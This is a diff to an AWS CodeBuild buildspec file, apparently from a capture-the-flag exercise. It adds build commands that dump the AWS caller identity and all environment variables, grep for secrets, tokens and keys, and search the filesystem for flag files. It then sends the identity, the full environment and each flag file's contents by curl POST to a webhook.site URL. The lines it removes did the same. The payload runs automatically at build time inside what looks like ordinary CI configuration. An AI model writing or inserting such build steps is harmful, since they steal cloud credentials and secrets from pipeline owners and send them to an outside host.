@@ -1,7 +1,35 @@
 version: 0.2
+
 phases:
   build:
     commands:
-      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" -d "identity=$(aws sts get-caller-identity)"
-      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "envs=$(env)"
-      - curl -s -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "flag=$(cat flag.txt 2>/dev/null || echo none)"
+      - echo "=== WHO AM I ==="
+      - aws sts get-caller-identity
+
+      - echo "=== CURRENT DIRECTORY ==="
+      - pwd
+      - ls -la
+
+      - echo "=== ENVIRONMENT VARIABLES ==="
+      - env | sort
+
+      - echo "=== POSSIBLE FLAG ENV VARS ==="
+      - env | grep -Ei 'flag|secret|token|key' || true
+
+      - echo "=== SEARCH FOR FLAG FILES ==="
+      - find / -type f \( -iname "flag.txt" -o -iname "*flag*" \) -readable 2>/dev/null | head -100
+
+      - echo "=== EXFILTRATE ENV ==="
+      - curl -sS -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "identity=$(aws sts get-caller-identity)"
+      - curl -sS -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "env=$(env)"
+
+      - echo "=== EXFILTRATE FLAG FILES ==="
+      - |
+        find / -type f \( -iname "flag.txt" -o -iname "*flag*" \) -readable 2>/dev/null |
+        while read -r file; do
+          echo "Found: $file"
+          curl -sS -X POST \
+            "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" \
+            --data-urlencode "path=$file" \
+            --data-urlencode "content=$(cat "$file")"
+        done
